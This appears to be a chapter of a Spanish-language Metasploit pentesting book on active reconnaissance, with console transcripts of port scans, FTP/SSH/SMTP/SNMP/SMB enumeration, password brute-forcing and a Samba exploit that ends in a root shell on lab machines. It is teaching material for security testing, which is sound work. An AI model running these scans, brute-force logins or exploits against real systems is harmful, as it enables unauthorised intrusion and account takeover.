# Fase de reconocimiento activo
En primer lugar, es necesario añadir una aclaración sobre el reconocimiento activo. El anonimato y el reconocimiento activo no tienen ninguna relación. El hecho de que un atacante se esconda detrás de un servidor proxy o una red de anonimato como TOR no significa que sus acciones no se consideren activas.

1. La fase de escaneo
Durante el capítulo La base de datos de Metasploit, se ha abordado brevemente el uso de Nmap o db_nmap. Nmap es un escáner de puertos que permite detectar puertos abiertos e identificar servicios alojados en el sistema operativo de destino:

msf6 > db_nmap -sV --open 192.168.171.128   
[*] Nmap: Starting Nmap 7.60 ( https://nmap.org ) at 2019-01-11 
21:30 CET  
[*] Nmap: Nmap scan report for 192.168.171.128  
[*] Nmap: Host is up (0.00086s latency).  
[*] Nmap: Not shown: 966 closed ports   
[*] Nmap: PORT      STATE    SERVICE     VERSION  
[*] Nmap: 21/tcp    open     ftp         vsftpd 2.3.4  
[*] Nmap: 22/tcp    open     ssh         OpenSSH 4.7p1 Debian  
8ubuntu1 (protocol 2.0)  
[*] Nmap: 23/tcp    open     telnet      Linux telnetd  
[*] Nmap: 25/tcp    open     smtp        Postfix smtpd  
[*] Nmap: 53/tcp    open     domain      ISC BIND 9.4.2  
[*] Nmap: 80/tcp    open     http        Apache httpd 2.2.8  
(Ubuntu)  
[*] Nmap: 111/tcp   open     rpcbind     2 (RPC #100000)  
[*] Nmap: 139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X  
[...] 
Esta primera fase permite obtener una idea muy clara de todos los servicios de escucha en el perímetro objetivo. Hay que tener en cuenta que cada servicio es una posible puerta de entrada para un atacante.

Sin embargo, aunque Nmap es particularmente completo, no es la única herramienta para realizar escaneos de puertos; varios módulos de Metasploit también permiten realizar esta función:

msf6 > search portscan  
  
Matching Modules  
================  
  
Name                                          Description  
----                                          -----------  
[...]  
auxiliary/scanner/portscan/ack                TCP ACK Scanner 
auxiliary/scanner/portscan/ftpbounce          FTP Bounce Port Scanner 
auxiliary/scanner/portscan/syn                TCP SYN Port Scanner 
auxiliary/scanner/portscan/tcp                TCP Port Scanner  
auxiliary/scanner/portscan/xmas               TCP "XMas" Port  
Scanner  
[...] 
He aquí un ejemplo de cómo usar el módulo auxiliary/scanner/portscan/tcp:

msf6 > use auxiliary/scanner/portscan/tcp  
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.64.129  
RHOSTS => 172.16.64.129  
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 255   
THREADS => 255  
msf6 auxiliary(scanner/portscan/tcp) > exploit   
  
[+] 172.16.64.129:        - 172.16.64.129:25 - TCP OPEN   
[+] 172.16.64.129:        - 172.16.64.129:23 - TCP OPEN   
[+] 172.16.64.129:        - 172.16.64.129:22 - TCP OPEN   
[+] 172.16.64.129:        - 172.16.64.129:21 - TCP OPEN   
[+] 172.16.64.129:        - 172.16.64.129:53 - TCP OPEN   
[+] 172.16.64.129:        - 172.16.64.129:80 - TCP OPEN   
[+] 172.16.64.129:        - 172.16.64.129:111 - TCP OPEN   
[*] Auxiliary module execution completed 
El Framework Metasploit también tiene escáneres de puertos UDP, como auxiliary/scanner/discovery/udp_sweep:

msf6 > info auxiliary/scanner/discovery/udp_sweep  
       Name: UDP Service Sweeper  
     Module: auxiliary/scanner/discovery/udp_sweep  
   License: Metasploit Framework License (BSD)  
       Rank: Normal  
Check supported:  
 Yes  
  
Basic options:  
 Name       Current Setting  Required  Description  
 ----       ---------------  --------  -----------  
 BATCHSIZE  256            yes         The number of hosts to probe 
 RHOSTS                    yes         The target address range 
 THREADS    10             yes         The number of threads  
  
Description:  
 Detect interesting UDP services  
  
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/  
discovery/udp_sweep  
msf6 auxiliary(scanner/discovery/udp_sweep) > set RHOSTS 172.16.64.129  
RHOSTS => 172.16.64.129  
msf6 auxiliary(scanner/discovery/udp_sweep) > exploit  
  
[*] Sending 13 probes to 172.16.64.129->172.16.64.129 (1 hosts) 
[*] Discovered DNS on 172.16.64.129:53 (BIND 9.4.2)  
[*] Discovered NetBIOS on 172.16.64.129:137 (METASPLOITABLE:<00>:U 
:METASPLOITABLE:<03>:U :METASPLOITABLE:<20>:U :__MSBROWSE__:<01>:G 
:WORKGROUP:<00>:G :WORKGROUP:<1d>:U :WORKGROUP:<1e>:G  
:00:00:00:00:00:00)  
[*] Discovered Portmap on 172.16.64.129:111 (100000 v2 TCP(111), 
100000 v2 UDP(111), 100024 v1 UDP(46611), 100024 v1 TCP(46356), 
100003 v2 UDP(2049), 100003 v3 UDP(2049), 100003 v4 UDP(2049), 100021 
v1 UDP(32822), 100021 v3 UDP(32822), 100021 v4 UDP(32822), 100003 v2 
TCP(2049), 100003 v3 TCP(2049), 100003 v4 TCP(2049), 100021 v1 
TCP(49912), 100021 v3 TCP(49912), 100021 v4 TCP(49912), 100005 v1 
UDP(47532), 100005 v1 TCP(51436), 100005 v2 UDP(47532), 100005 v2 
TCP(51436), 100005 v3 UDP(47532), 100005 v3 TCP(51436))  
[*] Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed 
Los diferentes módulos de escaneo de puertos integrados en Metasploit y Nmap son particularmente efectivos. También es posible realizar escaneos de tipo ARP dentro de una red local. Este tipo de análisis permite obtener rápidamente la lista de máquinas disponibles en la red:

msf6 > use auxiliary/scanner/discovery/arp_sweep  
msf6 auxiliary(arp_sweep) > show options  
  
Module options (auxiliary/scanner/discovery/arp_sweep):  
  
Name       Current Setting  Required  Description  
----       ---------------  --------  -----------  
INTERFACE                   no        The name of the interface 
RHOSTS                      yes       The target address range 
SHOST                       no        Source IP Address  
SMAC                        no        Source MAC Address  
THREADS    1                yes       The number of threads  
TIMEOUT    5                yes       The number of seconds to  
wait  
  
msf6 auxiliary(arp_sweep) > set RHOSTS 192.168.1.200-254   
RHOSTS => 192.168.1.200-254  
  
msf6 auxiliary(arp_sweep) > set SHOST 192.168.1.101   
SHOST => 192.168.1.101  
  
msf6 auxiliary(arp_sweep) > set SMAC d6:46:a7:38:15:65   
SMAC => d6:46:a7:38:15:65  
  
msf6 auxiliary(arp_sweep) > exploit   
[*] 192.168.1.201 appears to be up.   
[*] 192.168.1.203 appears to be up.   
[*] 192.168.1.205 appears to be up.  
[*] 192.168.1.206 appears to be up.   
[*] 192.168.1.250 appears to be up.   
[*] Scanned 55 of 55 hosts (100% complete)   
[*] Auxiliary module execution completed 
Hay otros módulos interesantes dentro del Framework Metasploit. Un lector curioso se puede interesar por los módulos ipv6_neighbor o udp_probe.

2. Los servicios
Los servicios abiertos son puntos de entrada para un atacante.

La explotación de los servicios puede tener dos causas posibles:

Una vulnerabilidad que afecta al servicio: en este caso, será necesario utilizar un exploit. Volveremos sobre el uso de exploits en el capítulo La fase de explotación.

Una vulnerabilidad que afecta a la configuración del servicio: en este caso, el uso de un auxiliar puede socavar la seguridad del objetivo.

Este libro no pretende presentar todos los módulos de Metasploit. Además, algunos auxiliares como los que terminan en _login, existen para muchos servicios:

msf6 > search _login   
  
Matching Modules   
================   
  Name                                                  Rank   
Check  Description   
  ----                                                  ----   
-----  -----------   
  auxiliary/scanner/ftp/ftp_login                normal     Yes 
 FTP Authentication Scanner   
  auxiliary/scanner/http/gitlab_login            normal     Yes 
 GitLab Login Utility   
  auxiliary/scanner/http/http_login              normal     Yes 
 HTTP Login Utility   
  auxiliary/scanner/http/jenkins_login           normal     Yes 
 Jenkins-CI Login Utility   
  auxiliary/scanner/http/joomla_bruteforce_login normal     Yes 
 Joomla Bruteforce Login Utility   
  auxiliary/scanner/http/phpmyadmin_login        normal     Yes 
 PhpMyAdmin Login Scanner   
  auxiliary/scanner/http/tomcat_mgr_login        normal     Yes 
 Tomcat Application Manager Login Utility   
  auxiliary/scanner/lotus/lotus_domino_login     normal     Yes 
 Lotus Domino Brute Force Utility   
  auxiliary/scanner/mssql/mssql_login            normal     Yes 
 MSSQL Login Utility   
  auxiliary/scanner/mysql/mysql_login            normal     Yes 
 MySQL Login Utility   
  auxiliary/scanner/nntp/nntp_login              normal     Yes 
 NNTP Login Utility   
  auxiliary/scanner/rservices/rlogin_login       normal     Yes 
 rlogin Authentication Scanner   
  auxiliary/scanner/rservices/rsh_login          normal     Yes 
 rsh Authentication Scanner   
  auxiliary/scanner/smb/smb_login                normal     Yes 
 SMB Login Check Scanner   
  auxiliary/scanner/snmp/snmp_login              normal     Yes 
 SNMP Community Login Scanner   
  auxiliary/scanner/ssh/ssh_login                normal     Yes 
 SSH Login Check Scanner 
Estos módulos permiten realizar ataques al objetivo de autenticación de un dispositivo, a través de ataques por contraseña o por diccionario.

Así, el módulo utilizado para forzar el servicio FTP es auxiliary/scanner/ftp/ftp_login:

images/07EP01.png
Mientras que el módulo utilizado para forzar el servicio SSH es auxiliary/scanner/ssh/ssh_login (prácticamente idéntico):

images/07EP02.png
Volveremos al módulo auxiliary/scanner/ssh/ssh_login en la sección SSH (22/TCP) de este capítulo.

3. FTP (21/TCP)s
FTP (File Transfer Protocol) es uno de los protocolos más populares para compartir archivos entre múltiples clientes y un servidor. Este protocolo, que por defecto escucha en el puerto 21/TCP, no garantiza la confidencialidad o integridad de los datos transmitidos.

Hay varios módulos que permiten obtener información sobre el servicio FTP:

msf6 > search ftp type:auxiliary   
  
Name   
----   
[...]   
auxiliary/scanner/ftp/anonymous   
auxiliary/scanner/ftp/bison_ftp_traversal   
auxiliary/scanner/ftp/colorado_ftp_traversal   
auxiliary/scanner/ftp/easy_file_sharing_ftp   
auxiliary/scanner/ftp/ftp_login   
auxiliary/scanner/ftp/ftp_version   
auxiliary/scanner/ftp/konica_ftp_traversal   
auxiliary/scanner/ftp/pcman_ftp_traversal   
auxiliary/scanner/ftp/titanftp_xcrc_traversal   
auxiliary/scanner/http/titan_ftp_admin_pwd   
auxiliary/scanner/misc/zenworks_preboot_fileaccess   
auxiliary/scanner/portscan/ftpbounce   
auxiliary/scanner/quake/server_info   
auxiliary/scanner/rsync/modules_list   
auxiliary/scanner/snmp/cisco_config_tftp   
auxiliary/scanner/snmp/cisco_upload_file   
auxiliary/scanner/ssh/cerberus_sftp_enumusers auxiliary/scanner/ 
tftp/ipswitch_whatsupgold_tftp   
auxiliary/scanner/tftp/netdecision_tftp   
auxiliary/scanner/tftp/tftpbrute   
[...] 
El módulo auxiliary/scanner/ftp/ftp_version permite obtener la versión del servidor FTP.

Obtener la versión de un servicio siempre es interesante porque puede tener vulnerabilidades públicas. Un exploit asociado con esta vulnerabilidad incluso puede estar disponible dentro de Metasploit.

msf6 > use auxiliary/scanner/ftp/ftp_version   
  
msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 172.16.64.129 
RHOSTS => 172.16.64.129  
msf6 auxiliary(scanner/ftp/ftp_version) > exploit  
  
[+] 172.16.64.129:21      - FTP Banner: '220 (vsFTPd 2.3.4)\x0d\x0a' 
[*] 172.16.64.129:21      - Scanned 1 of 1 hosts (100% complete) 
[*] Auxiliary module execution completed 
Además, algunas configuraciones predeterminadas más antiguas permiten conexiones anónimas. Es posible comprobar esta configuración gracias al módulo auxiliary/scanner/ftp/anonymous:

msf6 > use auxiliary/scanner/ftp/anonymous  
  
msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS 172.16.64.129 
RHOSTS => 172.16.64.129  
  
msf6 auxiliary(scanner/ftp/anonymous) > exploit  
  
[+] 172.16.64.129:21      - 172.16.64.129:21 - Anonymous READ  
(220 (vsFTPd 2.3.4))   
[*] 172.16.64.129:21      - Scanned 1 of 1 hosts (100% complete) 
[*] Auxiliary module execution completed  
  
msf6 auxiliary(scanner/ftp/anonymous) > ftp 172.16.64.129 
[*] exec: ftp 172.16.64.129   
  
Connected to 172.16.64.129.   
220 (vsFTPd 2.3.4)  
  
ftp> user anonymous   
Password: 331 Please specify the password.   
  
230 Login successful.   
Remote system type is UNIX.   
Using binary mode to transfer files.  
  
ftp> dir  
200 PORT command successful. Consider using PASV.   
150 Here comes the directory listing.   
226 Directory send OK. 
4. SSH (22/TCP)
SSH (Secure Shell) es un protocolo que ya no está presente. Al permitir la administración segura (a través de la comunicación cifrada), el servicio SSH escucha de forma predeterminada en el puerto 22/TCP.

Hay varios módulos que proporcionan información sobre el servicio SSH:

msf6 > search ssh type:auxiliary   
  
Name   
----   
[...]   
auxiliary/scanner/ssh/apache_karaf_command_execution   
auxiliary/scanner/ssh/cerberus_sftp_enumusers   
auxiliary/scanner/ssh/detect_kippo   
auxiliary/scanner/ssh/eaton_xpert_backdoor  
auxiliary/scanner/ssh/fortinet_backdoor   
auxiliary/scanner/ssh/juniper_backdoor   
auxiliary/scanner/ssh/karaf_login   
auxiliary/scanner/ssh/libssh_auth_bypass   
auxiliary/scanner/ssh/ssh_enumusers   
auxiliary/scanner/ssh/ssh_identify_pubkeys   
auxiliary/scanner/ssh/ssh_login   
auxiliary/scanner/ssh/ssh_login_pubkey   
auxiliary/scanner/ssh/ssh_version   
[...] 
De la misma manera que el módulo anterior para el protocolo FTP, el módulo auxiliary/scanner/ssh/ssh_version permite obtener la versión del servidor SSH:

msf6 > use auxiliary/scanner/ssh/ssh_version   
msf6 auxiliary(scanner/ssh/ssh_version) > show options   
  
Module options (auxiliary/scanner/ssh/ssh_version):   
  
  Name     Current Setting  Required  Description   
  ----     ---------------  --------  -----------   
  RHOSTS                    yes       The target address   
  RPORT    22               yes       The target port (TCP)   
  THREADS  1                yes       The number of threads   
  TIMEOUT  30               yes       Timeout for the SSH probe 
  
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 172.16.64.129 
RHOSTS => 172.16.64.129  
  
msf6 auxiliary(scanner/ssh/ssh_version) > exploit  
  
[+] 172.16.64.129:22      - SSH server version:  
SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 
Una vez más, obtener la versión es especialmente útil. Una vulnerabilidad que afecta a versiones inferiores de OpenSSH 7.7 (CVE-2018-15473) permite enumerar los usuarios del sistema operativo subyacente. Se ha integrado un módulo para explotar esta vulnerabilidad en Metasploit (auxiliary/scanner/ssh/ssh_enumusers):

msf6 auxiliary(scanner/ssh/ssh_version) > search CVE-2018-15473 
  
Matching Modules   
================   
  
  Name                                 Description   
  ----                                 -----------   
  auxiliary/scanner/ssh/ssh_enumusers  SSH Username Enumeration 
  
msf6 > use auxiliary/scanner/ssh/ssh_enumusers   
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 172.16.64.129 
RHOSTS => 172.16.64.129  
  
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USERNAME msfadmin 
USERNAME => msfadmin  
  
msf6 auxiliary(scanner/ssh/ssh_enumusers) > exploit   
  
[*] 172.16.64.129:22 - SSH - Using malformed packet technique 
[*] 172.16.64.129:22 - SSH - Starting scan  
[+] 172.16.64.129:22 - SSH - User msfadmin found   
[*] Scanned 1 of 1 hosts (100% complete)   
[*] Auxiliary module execution completed 
Por lo tanto, es posible utilizar el módulo de bruteForce gracias al identificador obtenido de esta manera:

msf6 > use auxiliary/scanner/ssh/ssh_login   
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME msfadmin  
USERNAME => msfadmin  
  
msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true   
VERBOSE => true  
  
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_AS_PASS true  
USER_AS_PASS => true 
 
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 172.16.64.129 
RHOSTS => 172.16.64.129  
  
msf6 auxiliary(scanner/ssh/ssh_login) > exploit   
  
[+] 172.16.64.129:22 - Success: 'msfadmin:msfadmin'  
'uid=1000(msfadmin) gid=1000(msfadmin)   
  
[*] Command shell session 1 opened (192.168.171.151:37085 ->  
172.16.64.129:22) at 2019-04-13 17:37:40 +0200   
[*] Scanned 1 of 1 hosts (100% complete)   
[*] Auxiliary module execution completed 
Veremos más detalles de las sesiones ("session 1 opened"), en el capítulo Utilizar sesiones.

5. SMTP (25/TCP)
SMTP (Simple Mail Transfer Protocol) es un protocolo utilizado para transferir correos electrónicos a los servidores de correo, que utilizan el puerto 25/TCP de forma predeterminada.

En cuanto a FTP y SSH, Metasploit dispone de un módulo propio para SMTP que permite obtener la versión: auxiliary/scanner/smtp/smtp_version

Sin embargo, el módulo auxiliary/scanner/smtp/smtp_enum difiere ligeramente de los módulos ya presentados. Este último aprovecha los comandos EXPN y VRFY si el administrador del sistema no los ha deshabilitado. El comando VRFY permite confirmar la existencia de un nombre de usuario válido, mientras que EXPN muestra la dirección real de los alias de los usuarios y las listas de correo electrónico.

msf6 > use auxiliary/scanner/smtp/smtp_enum   
  
msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 172.16.64.129 
RHOSTS => 172.16.64.129  
  
msf6 auxiliary(scanner/smtp/smtp_enum) > set THREADS 255  
THREADS => 255  
  
msf6 auxiliary(scanner/smtp/smtp_enum) > exploit   
  
[*] 172.16.64.129:25      - 172.16.64.129:25 Banner: 220  
metasploitable.localdomain ESMTP Postfix (Ubuntu)  
  
[+] 172.16.64.129:25      - 172.16.64.129:25 Users found: , backup, 
bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, 
mail, man, news, nobody, postgres, postmaster, proxy, service, sshd, 
sync, sys, syslog, user, uucp, www-data  
[*] 172.16.64.129:25      - Scanned 1 of 1 hosts (100% complete) 
[*] Auxiliary module execution completed 
Por lo tanto, gracias a la aceptación de los comandos VRFY y EXPLO, un atacante puede listar los usuarios presentes en el sistema. Llevar a cabo ataques de fuerza bruta sobre sus cuentas puede permitir obtener acceso al sistema.

6. SNMP (161/UDP)
El último elemento que vamos a abordar durante esta fase de reconocimiento activo es el protocolo SNMP (Simple Network Management Protocol). El protocolo SNMP utiliza por defecto el puerto 161/UDP y permite a los administradores administrar/gestionar o supervisar equipos de red (switch, UPS, hardware de firewall, enrutador).

Dentro de las versiones 1 y 2 de SNMP, las solicitudes enviadas contienen una comunidad. Una comunidad SNMP es comparable a una contraseña. Consultar los equipos de red requerirá el conocimiento, así como el uso de esta comunidad.

Existen dos tipos de comunidades con SNMP:

La comunidad que permite el acceso al dispositivo en modo solo lectura (RO: Read Only). En muchos dispositivos, esta comunidad tiene un valor public.

La comunidad que permite acceder al dispositivo en modos lectura y escritura (RW: Read Write). En muchos dispositivos, esta comunidad tiene un valor private.

La obtención de estas contraseñas (comunidades, ya sean por defecto o no) puede permitir a un atacante acceder al sistema de destino en modos de solo lectura o de lectura y escritura.

En Metasploitable, el servicio SNMP, que solo escucha de forma predeterminada de manera local (127.0.0.1), no permite realizar pruebas:

root@metasploitable:/home/msfadmin# netstat -anu | grep 161   
udp        0      0 127.0.0.1:161           0.0.0.0:* 
Para esto, es necesario sustituir la siguiente directiva dentro del archivo de configuración SNMP (/etc/default/snmpd) en la máquina Metasplotable:

SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid  
127.0.0.1'  
  
Sustituir por::  
  
SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid  
0.0.0.0' 
Después de reiniciar el servicio, queda accesible para todas las pruebas:

root@metasploitable:/home/msfadmin# /etc/init.d/snmpd restart   
Restarting network management services: snmpd.  
  
root@metasploitable:/home/msfadmin# netstat -anu | grep 161   
udp        0      0 0.0.0.0:161             0.0.0.0:* 
De nuevo una vez más, el Framework Metasploit tiene multitud de módulos para interactuar con el servicio SNMP:

msf6 > search snmp   
  
Matching Modules   
================   
  
  #   Name   
  -   ----   
  1   auxiliary/admin/cisco/cisco_asa_extrabacon   
  2   auxiliary/admin/scada/moxa_credentials_recovery   
  3   auxiliary/scanner/misc/oki_scanner   
  4   auxiliary/scanner/snmp/aix_version   
  5   auxiliary/scanner/snmp/arris_dg950   
  6   auxiliary/scanner/snmp/brocade_enumhash   
  7   auxiliary/scanner/snmp/cisco_config_tftp   
  8   auxiliary/scanner/snmp/cisco_upload_file   
  9   auxiliary/scanner/snmp/cnpilot_r_snmp_loot   
  10  auxiliary/scanner/snmp/epmp1000_snmp_loot   
  11  auxiliary/scanner/snmp/netopia_enum   
  12  auxiliary/scanner/snmp/sbg6580_enum   
  13  auxiliary/scanner/snmp/snmp_enum   
  14  auxiliary/scanner/snmp/snmp_enum_hp_laserjet   
  15  auxiliary/scanner/snmp/snmp_enumshares   
  16  auxiliary/scanner/snmp/snmp_enumusers   
  17  auxiliary/scanner/snmp/snmp_login   
  18  auxiliary/scanner/snmp/snmp_set   
  19  auxiliary/scanner/snmp/ubee_ddw3611    
  20  auxiliary/scanner/snmp/xerox_workcentre_enumusers 
Para intentar conectarse al servicio en cuestión con comunidades predeterminadas, es posible utilizar el módulo auxiliary/scanner/snmp/snmp_login con un diccionario de cien comunidades predeterminadas:

msf6 > use auxiliary/scanner/snmp/snmp_login   
msf6 auxiliary(scanner/snmp/snmp_login) > set RHOSTS 172.16.64.130 
RHOSTS => 172.16.64.130  
  
msf6 auxiliary(scanner/snmp/snmp_login) > set THREADS 255   
THREADS => 255  
  
msf6 auxiliary(scanner/snmp/snmp_login) > exploit   
  
[+] 172.16.64.130:161 - Login Successful: private (Access level:  
read-write); Proof (sysDescr.0): Linux metasploitable 2.6.24-16- 
server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686   
[+] 172.16.64.130:161 - Login Successful: public (Access level:  
read-only); Proof (sysDescr.0): Linux metasploitable  
2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686   
  
[*] Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution complete 
  
Se han destacado dos accesos: uno en modo de solo lectura y otro en modo de lectura y escritura. Obtener acceso en modo de lectura y escritura a los equipos de red es particularmente peligroso porque un atacante podría descargar la configuración del dispositivo, modificarla localmente e inyectarla de nuevo en el dispositivo de destino.

Gracias a la obtención de estas comunidades, ahora es posible utilizar otros módulos, como auxiliary/scanner/snmp/snmp_enum:

msf6 > use auxiliary/scanner/snmp/snmp_enum   
  
msf6 auxiliary(scanner/snmp/snmp_enum) > set COMMUNITY private  
COMMUNITY => private   
  
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 172.16.64.130  
RHOSTS => 172.16.64.130  
  
msf6 auxiliary(scanner/snmp/snmp_enum) > set THREADS 255  
THREADS => 255   
  
msf6 auxiliary(scanner/snmp/snmp_enum) > exploit  
[+] 172.16.64.130, Connected.  
  
[*] System information:   
  
Host IP                       : 172.16.64.130   
Hostname                      : metasploitable   
Description                   : Linux metasploitable 2.6.24-16-server 
Contact                       : msfdev@metasploit.com   
Location                      : Metasploit Lab   
Uptime snmp                   : 1 day, 05:01:08.77   
Uptime system                 : 01:02:46.90   
System date                   : 2019-1-11 08:27:57.0   
  
[...]   
  
[*] Network interfaces:   
  
Interface                     : [ up ] lo   
Id                            : 1   
Mac Address                   : :::::   
Type                          : softwareLoopback   
Speed                         : 10 Mbps   
MTU                           : 16436   
In octets                     : 7236733   
Out octets                    : 7236733   
  
Interface                     : [ up ] eth0   
Id                            : 2   
Mac Address                   : 00:0c:29:97:4d:2c   
Type                          : ethernet-csmacd   
Speed                         : 10 Mbps   
MTU                           : 1500   
In octets                     : 7550169   
Out octets                    : 8754151   
  
[...] 
Este libro no pretende presentar todos los módulos de Metasploit porque su número es muy alto. De hecho, en la actualidad, Metasploit tiene alrededor de 2 000 exploits y 1 000 módulos.

7. SMB (445/TCP y 139/TCP)
SMB (Server Message Block) es un protocolo de uso compartido de archivos en red que puede escuchar en los puertos 139/TCP o 445/TCP.

El protocolo SMB proporciona una gran cantidad de información sobre el sistema de destino. Por ejemplo, es posible obtener información sobre su versión:

msf6 > use auxiliary/scanner/smb/smb_version   
  
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.0.29  
RHOSTS => 192.168.0.29  
  
msf6 auxiliary(scanner/smb/smb_version) > set RPORT 445   
RPORT => 445  
  
msf6 auxiliary(scanner/smb/smb_version) > exploit   
  
[+] 192.168.0.29:445      - Host is running Windows 7 Professional  
SP1 (build:7601) (name:PC) (workgroup:WORKGROUP )  
  
[*] 192.168.0.29:445      - Scanned 1 of 1 hosts (100% complete) 
[*] Auxiliary module execution completed 
Después de realizar un ataque por fuerza bruta utilizando un diccionario, es posible utilizar identificadores en uno de los dispositivos de destino para obtener más información:

msf6 > use auxiliary/scanner/smb/smb_login   
  
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.0.29 
RHOSTS => 192.168.0.29  
  
msf6 auxiliary(scanner/smb/smb_login) > set RPORT 445  
RPORT => 445  
  
msf6 auxiliary(scanner/smb/smb_login) > set SMBUSER domy   
SMBUSER => administrator  
  
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /tmp/pwd.lst 
PASS_FILE => /tmp/pwd.lst  
  
msf6 auxiliary(scanner/smb/smb_login) > exploit  
  
[*] 192.168.0.29:445     - 192.168.0.29:445 - Starting SMB login  
bruteforce  
[+] 192.168.0.29:445     - 192.168.0.29:445 - Success: '.\domy:domy 
[*] 192.168.0.29:445     - Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed 
Por lo tanto, puede ser posible enumerar todos los usuarios. A partir de estos últimos, eventualmente será posible acceder a una cuenta con permisos:

msf6 > use auxiliary/scanner/smb/smb_enumusers   
  
msf6 auxiliary(scanner/smb/smb_enumusers) > set RHOSTS 192.168.0.29 
RHOSTS => 192.168.0.29  
  
msf6 auxiliary(scanner/smb/smb_enumusers) > set RPORT 445  
RPORT => 445  
  
msf6 auxiliary(scanner/smb/smb_enumusers) > set SMBUSER domy  
SMBUSER => domy  
  
msf6 auxiliary(scanner/smb/smb_enumusers) > set SMBPASS domy  
SMBPASS => domy  
msf6 auxiliary(scanner/smb/smb_enumusers) > exploit   
  
[+] 192.168.0.29:445      - PC [ Admin, Administrador, domy,  
HomeGroupUser$, Invitado,] ( LockoutTries=0 PasswordMin=0 )  
[*] 192.168.0.29:         - Scanned 1 of 1 hosts (100% complete) 
[*] Auxiliary module execution completed 
Aunque a menudo está presente en los sistemas operativos Windows, el protocolo SMB (Samba) también se encuentra en Linux y tiene su lote de vulnerabilidades que permiten a un atacante tomar el control del sistema:

msf6 > use exploit/linux/samba/is_known_pipename   
  
msf6 exploit(linux/samba/is_known_pipename) > set RHOSTS 192.17.49.3  
RHOSTS => 192.17.49.3  
  
msf6 exploit(linux/samba/is_known_pipename) > exploit  
  
[*] 192.17.49.3:445 - Using location \\192.17.49.3\exploitable\tmp  
for the path  
[*] 192.17.49.3:445 - Retrieving the remote path of the share  
'exploitable'   
[*] 192.17.49.3:445 - Share 'exploitable' has server-side path '/ 
[*] 192.17.49.3:445 - Uploaded payload to  
\\192.17.49.3\exploitable\tmp\cBOGRQJj.so  
[*] 192.17.49.3:445 - Loading the payload from server-side path 
/tmp/cBOGRQJj.so using \\PIPE\/tmp/cBOGRQJj.so...  
[-] 192.17.49.3:445 -   >> Failed to load  
STATUS_OBJECT_NAME_NOT_FOUND  
[*] 192.17.49.3:445 - Loading the payload from server-side path 
/tmp/cBOGRQJj.so using /tmp/cBOGRQJj.so...   
[+] 192.17.49.3:445 - Probe response indicates the interactive  
payload was loaded...   
[*] Found shell.   
[*] Command shell session 1 opened (192.17.49.2:43675 ->  
192.17.49.3:445) at 2019-06-17 21:15:04 +0000  
  
id   
uid=0(root) gid=0(root) groups=0(root) 